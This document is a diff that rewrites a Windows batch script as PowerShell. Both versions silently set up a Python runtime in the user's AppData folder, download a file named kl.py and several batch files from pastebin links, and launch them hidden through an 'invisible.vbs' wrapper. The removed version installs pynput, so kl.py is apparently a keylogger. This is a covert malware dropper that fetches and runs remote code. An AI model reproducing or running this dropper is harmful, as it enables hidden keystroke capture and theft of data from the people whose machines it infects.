@@ -1,34 +1,19 @@
-echo off
-cls
-cd %appdata%
+If (Test-Path -Path "$env:APPDATA\py\installed" ) {
+wscript.exe "$env:APPDATA\invisible.vbs" "$env:APPDATA\py\start_v1.bat"
+}
 
-if exist py\kl.py (
-	if exist py\start_v1.bat (
-		cd py
-		GOTO run
-	) else (
-		GOTO install
-	)
-) else (
-	GOTO install
-)
+Else {
+New-Item -Path "$env:APPDATA\" -Name "py" -ItemType Directory
 
-:install
-mkdir py
-cd py
-powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.10.9/python-3.10.9-embed-amd64.zip -Outfile python.zip"
-tar -xf python.zip
-powershell -Command "Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -Outfile get-pip.py"
-powershell -Command "Invoke-WebRequest https://pastebin.com/raw/dzRvGa3K -Outfile python310._pth"
-python.exe get-pip.py
-cd Scripts
-pip install requests
-pip install pynput
-cd %appdata%
-cd py
-powershell -Command "Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile start_v1.bat"
-powershell -Command "Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile kl.py"
-GOTO run
+Invoke-WebRequest https://www.python.org/ftp/python/3.10.9/python-3.10.9-embed-amd64.zip -Outfile $env:APPDATA\py\python.zip
 
-:run
-wscript.exe "%appdata%/invisible.vbs" "start_v1.bat"
+Expand-Archive -Path $env:APPDATA\py\python.zip -DestinationPath $env:APPDATA\py\
+
+Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -Outfile $env:APPDATA\py\get-pip.py
+Invoke-WebRequest https://pastebin.com/raw/dzRvGa3K -Outfile $env:APPDATA\py\python310._pth
+Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile $env:APPDATA\py\start_v1.bat
+Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile $env:APPDATA\py\kl.py
+
+Invoke-WebRequest https://pastebin.com/raw/C5kW8g8m -Outfile $env:APPDATA\py\installpython.bat
+wscript.exe "$env:APPDATA\invisible.vbs" "$env:APPDATA\py\installpython.bat"
+}
